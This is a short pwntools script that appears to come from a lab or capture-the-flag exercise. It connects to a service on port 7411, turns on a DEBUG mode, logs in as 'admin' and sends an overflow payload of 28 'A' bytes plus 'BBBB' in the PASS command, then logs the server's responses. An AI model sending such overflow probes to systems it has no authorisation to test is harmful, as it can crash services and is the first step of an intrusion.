#!/usr/bin/env python3
"""diag3.py - timed dump of everything the server sends after the overflow."""
import sys
import time
from pwn import *  # noqa: F403

context.update(arch="i386", os="linux", log_level="error")
HOST = sys.argv[1] if len(sys.argv) > 1 else "10.129.63.36"

c = remote(HOST, 7411, timeout=10)
c.recvuntil(b"Send USER command.")
c.sendline(b"DEBUG")
print("t+0  sent DEBUG")
c.recvuntil(b"DEBUG mode on.")
c.sendline(b"USER admin")
print("t+0  sent USER admin")
c.recvuntil(b"Send PASS command.")
c.sendline(b"PASS " + b"A" * 28 + b"BBBB")
print("t+0  sent overflow payload")

for i in range(10):
    try:
        d = c.recv(timeout=1)
        print(f"t+{i}s recv({len(d)}): {d!r}")
        if not d:
            print("t+%ds EOF" % i)
            break
    except EOFError:
        print(f"t+{i}s EOF")
        break
    except Exception as e:
        print(f"t+{i}s err: {e!r}")
        break
c.close()
print("done")
